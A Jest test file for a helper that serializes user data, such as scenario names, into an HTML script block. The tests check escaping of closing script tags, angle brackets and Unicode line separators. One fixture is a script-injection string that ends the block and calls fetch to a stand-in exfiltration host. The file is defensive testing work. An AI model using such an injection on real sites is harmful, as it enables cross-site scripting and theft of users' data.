import { jsonForScript } from './json-for-script'

describe('jsonForScript', () => {
  /** Un nom de scénario est saisi par l'utilisateur puis sérialisé dans un `<script>`. */
  it('should keep a closing script tag from ending the block', () => {
    const payload = jsonForScript({ name: '</script><script>fetch("//exfiltration.test")</script>' })

    expect(payload).not.toContain('</script>')
    expect(payload).toContain('\\u003c')
  })

  it('should escape angle brackets wherever they appear', () => {
    expect(jsonForScript('<img src=x>')).not.toContain('<')
    expect(jsonForScript(['<a>', '<b>'])).not.toContain('<')
    expect(jsonForScript({ '<clé>': '<valeur>' })).not.toContain('<')
  })

  /** Valides en JSON, interdits dans un littéral JavaScript. */
  it('should escape the separators JSON allows but JavaScript refuses', () => {
    expect(jsonForScript('a b')).toContain('\\u2028')
    expect(jsonForScript('a b')).toContain('\\u2029')
  })

  /** `undefined` est du JavaScript valide, et ce que les gabarits attendent. */
  it('should keep producing valid JavaScript for an absent value', () => {
    expect(jsonForScript(undefined)).toBe('undefined')
  })

  it('should leave ordinary data untouched and still parseable', () => {
    const value = { labels: ['Scénario haut', 'Scénario bas'], values: [1200, 800] }

    expect(JSON.parse(jsonForScript(value))).toEqual(value)
  })

  /** Des accents, pas du balisage. */
  it('should leave French labels readable', () => {
    expect(jsonForScript('Besoins en logements — Côte-d’Or')).toContain('Côte')
  })
})
